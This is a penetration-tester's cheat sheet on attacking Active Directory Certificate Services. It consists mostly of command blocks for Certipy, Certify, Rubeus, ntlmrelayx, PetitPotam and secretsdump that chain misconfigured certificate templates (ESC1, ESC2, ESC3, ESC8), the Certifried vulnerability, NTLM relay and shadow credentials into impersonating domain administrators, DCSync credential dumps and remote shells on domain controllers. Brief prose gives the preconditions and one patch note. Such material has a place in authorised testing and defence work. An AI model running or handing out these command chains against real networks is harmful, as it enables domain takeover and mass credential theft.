# ADCS (Active Directory Certificate Services)

{% embed url="https://github.com/ly4k/Certipy" %}

{% code overflow="wrap" fullWidth="true" %}
```sh
# Find vulnerable certificate
certipy find -u $USER -p $PASS -target domain.local -text -stdout -vulnerable
Certify.exe find /vulnerable
# Request certificate
certipy req -u $USER -p $PASS -target domain.local -upn administrator@domain.local -ca $CA_NAME -template $TEMPLATE_NAME -debug
Certify.exe request /ca:$CA_NAME /template:$TEMPLATE_NAME /altname:administrator
# Pass-the-Ticket
certipy auth -pfx administrator.pfx
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx 
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap
# If 5986 (WinRM SSL is open), we can authenticate with evil-winrm
evil-winrm -S -c key.cert -k key.pem -i $IP # IP or dom.local
```
{% endcode %}

**Tactic:** Attacks involving Active Directory Certificate Services (AD CS) have become popular since the[ Certified Pre-Owned white paper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) was released in 2021.&#x20;

It disclosed eight different attacks against AD CS (specifically those involving misconfigured certificate templates), with the attack labeled ESC1 arguably being the most widespread in AD environments and easiest to pull off with readily available tools from a Windows or Linux attack host.&#x20;

This attack is possible if certain criteria are met:&#x20;

1. The Certificate Authority (CA) grants enrollment rights to low-privileged users (meaning they can request certificates),&#x20;
2. Approval is not required by a “manager” user for certificate requests,&#x20;
3. Certificate requests do not need to be signed,&#x20;
4. A certificate template exists that grants enrollment rights to low-privileged users, meaning a user is able to request and obtain a certificate based on the given template
5. The last condition (that makes this attack so powerful) is that the given certificate template allows the requestor to specify a Subject Alternate Name (SAN).&#x20;

Linux [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

Windows [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)

CVE-2022-26923, commonly referred to as _**Certifried**_, is an Active Directory domain privilege escalation vulnerability that was patched as part of Microsoft’s May 2022 security updates.&#x20;

The vulnerability, first reported by [Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4), abuses Active Directory Certificate Services (AD CS) to request machine certificates with arbitrary attacker-controlled DNS host names.

{% code overflow="wrap" fullWidth="true" %}
```sh
https://github.com/ly4k/Certipy
# Create a machine account
certipy account create -u username@domain -p password -user <Account Name> -dns <dNSHostName> [-dc-ip <DC IP>]
# Request a new certificate
certipy req -u username@domain -p password -ca <CA Name> -template Machine
# Authentication to receive the certificate file
certipy auth -pfx dc.pfx -dc-ip <DC IP>
# The NT Hash of the dc$ computer object is returned
# Finally, DCSync attack
secretsdump 'domain/DC$dc.domain' -hashes :<NT Hash>

# Certipy implements more domain escalation techniques
https://github.com/ly4k/Certipy#domain-escalation

# Mitigating CVE-2022-26923
The May 2022 Security Update https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923 for Windows systems includes a patch
This effectively prevents the basic attack described above, where a new machine is added to the domain by an unprivileged user, which automatically inherits “Validated write to DNS host name” rights to the account. However, a user with higher privileges (like GenericWrite) on any machine account would still be able to add a custom dNSHostName value.
```
{% endcode %}

## Stealthy way&#x20;

<pre class="language-sh"><code class="lang-sh"><strong># Look for certificates here
</strong>HKEY_USERS\.DEFAULT\Software\Microsoft\Cryptography\CertificateTemplateCache\
</code></pre>

## ESC8 - coerce to domain admin

To make this attack work we will need :

* ADCS running on the domain with web enrollment enabled.
* A working coerce method (here we use petitpotam unauthent, but an authenticated printerbug or other coerce methods will work the same)

{% code overflow="wrap" fullWidth="true" %}
```bash
# Add a listener to relay SMB authentication to HTTP with impacket ntlmrelayx
ntlmrelayx.py -t http://$IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Launch the coerce with petitpotam unauthenticated (this won't work no more on up to date AD but other auth methods will)
https://github.com/topotam/PetitPotam
petitpotam.py $GATEWAY_IP domain.local
# Ask for a TGT with the certificate we just get (we copied it to the file cert.b64)
gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'domain.local'/'TARGET_SAMNAME$' 'TGT_CCACHE_FILE'
# We got a TGT so we can launch a DCsync and get all the ntds.dit content
export KRB5CCNAME=tgt.ccache
secretsdump -k -no-pass domain.local/'TARGET_SAMNAME$'@dc.domain.local
```
{% endcode %}

## ESC8 - with certipy

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/ly4k/Certipy
# Setup the listener
certipy relay -ca $HOST_IP -template DomainController
# Trig the coerce with petitpotam
petitpotam.py $GATEWAY_IP domain.local
# Now we got the certificate so we can get the NT hash of the DC and also the TGT with the command:
certipy auth -pfx file.pfx -dc-ip $DC_IP 
# And we can launch a DCsync with secretsdump and the ticket we get
export KRB5CCNAME=tgt.ccache
secretsdump -k -no-pass domain.local/'TARGET_SAMNAME$'@dc.domain.local
# or with the hash
secretsdump -hashes ':$LM_HASH' -no-pass domain.local/'TARGET_SAMNAME$'@dc.domain.local
```
{% endcode %}

## Reconnaissance and enumeration&#x20;

{% code overflow="wrap" fullWidth="true" %}
```bash
# Search the certificate server, and dump all the information in three formats
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
# Show just the vulnerable templates
certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout
# To see it on Bloodhound, PKI->Find certificate authority, select the certificate authority and click : “see enabled templates”
```
{% endcode %}

## ESC1

{% code overflow="wrap" fullWidth="true" %}
```bash
# Enumerate
certipy find -u user@domain.local -p 'password' -dc-ip $DC_IP
# Query the certificate (target is ca server or domain or IP, template is the vulnerable template, upn is target user to impersonate
certipy req -u user@domain.local -p 'password' -target $CA_SERVER -template ESC1 -ca DOMAIN-CA -upn administrator@domain.local
# Authentication with the pfx we request before
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```
{% endcode %}

## ESC2 & ESC3

{% code overflow="wrap" fullWidth="true" %}
```bash
#     Query cert
certipy req -u user@domain.local -p 'password' -target $IP -template ESC2 -ca DOMAIN-CA
#     Query cert with the Certificate Request Agent certificate we get before (-pfx)
certipy req -u user@domain.local -p 'password' -target $IP -template User -ca DOMAIN-CA -on-behalf-of 'domain\administrator' -pfx user.pfx
# Auth
certipy auth -pfx administrator.pfx -dc-ip $IP
# We also can do the same with the ESC3-CRA and ESC3 templates
certipy req -u user@domain.local -p 'password' -target $IP -template ESC3-CRA -ca DOMAIN-CA
certipy req -u user@domain.local -p 'password' -target $IP -template ESC3 -ca DOMAIN-CA -on-behalf-of 'domain\administrator' -pfx user.pfx
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip $DC_IP
```
{% endcode %}

## ESC9, ESC10...

[https://github.com/ly4k/Certipy?tab=readme-ov-file#esc9--esc10](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc9--esc10)

[https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

[https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension)

## Certifried - CVE-2022–26923

{% code overflow="wrap" fullWidth="true" %}
```bash
https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
# Having domain user creds, create an account and set a fake dns name as the domain controller.
certipy account create -u $user@domain.local -p '$PASS' -user 'certifriedpc' -pass 'certifriedpass' -dns 'sub.domain.local'
#     Request a certificate with the created computer on template Machine
certipy req -u 'certifriedpc$'@domain.local -p 'certifriedpass' -target $FQDN -ca DOMAIN-CA -template Machine
#     Authenticate with the certificate as the DC (DC$ or TARGET_SAMNAME$ should be the same, try both in case of doubt)
certipy auth -pfx file.pfx -username 'DC$' -domain domain.local -dc-ip $DC_IP
#     Dump the ndts with the kerberos ticket we just get
export KRB5CCNAME=/workspace/certifried/meereen.ccache
secretsdump -k -no-pass -just-dc-user $DOMAIN_ADMIN_USER DOMAIN.LOCAL/'TARGET_SAMNAME$'@dc.domain.local
#     delete the created computer with a domain admin user
certipy account delete -u $DOMAIN_ADMIN_USER@domain.local -hashes 'aad3b435b51404eeaad3b435b51404ee:$LM_HASH' -user 'certifriedpc'

# In case we cannot DCSync or we just want a shell, use the DC TGT we got previously to impersonate Administrator
export KRB5CCNAME=administrator.ccache
python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'CIFS/dc.domain.local' -k -no-pass -dc-ip 'dc.domain.local' 'domain.local'/'$DOMAIN'
#     and now we can use our ticket
export KRB5CCNAME=administrator@CIFS...LOCAL.ccache
wmiexec.py -k @dc.domain.local
# In case we want to use WinRM we need HTTP altservice
export KRB5CCNAME=administrator.ccache
python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'HTTP/dc.domain.local' -k -no-pass -dc-ip 'dc.domain.local' 'domain.local'/'$DOMAIN'
export KRB5CCNAME=administrator@CIFS...LOCAL.ccache
evil-winrm -i meereen.essos.local -r ESSOS.LOCAL
```
{% endcode %}

## Forge certificate using stolen CA certificate (ForgeCert)

[https://github.com/GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert)

[https://github.com/Ridter/pyForgeCert](https://github.com/Ridter/pyForgeCert)

## Shadow Credentials

Shadow credentials attack consist of using the GenericAll or GenericWrite privilege on a user or computer to set up the attribute msDS-KeyCredentialLink.

[https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

With genericWrite you can only do:

* Target Kerberoasting : add an SPN to a user, do a kerberoasting, unset the spn. But the user password must be weak to the kerberoasting attack work.
* Set up a logon script : change ldap parameters to set up a logon script. but it implies that the user log to his computer, an smb server or a share to offer the script and setup a script that bypass the security solutions in place)
* shadow credentials : the attack we want to do, we need a cetificate service on the domain

With GenericAll you can :

* ForceChangePassword : but on a real pentest you donâ€™t want to block a user by changing his password. And this is not very stealthy too. So if you can do another way this is fine :)
* All the attacks available in the genericWrite part.

So if ADCS is enabled on the domain, and we got write privilege on msDS-KeyCredentialLink, we can do the shadow credentials attack to get a direct access on the user account.

{% code overflow="wrap" fullWidth="true" %}
```bash
certipy shadow auto -u user@domain.local -p 'password' -account '$USER_OVER_WHO_WE_HAVE_GENERIC_PRIVS'
```
{% endcode %}
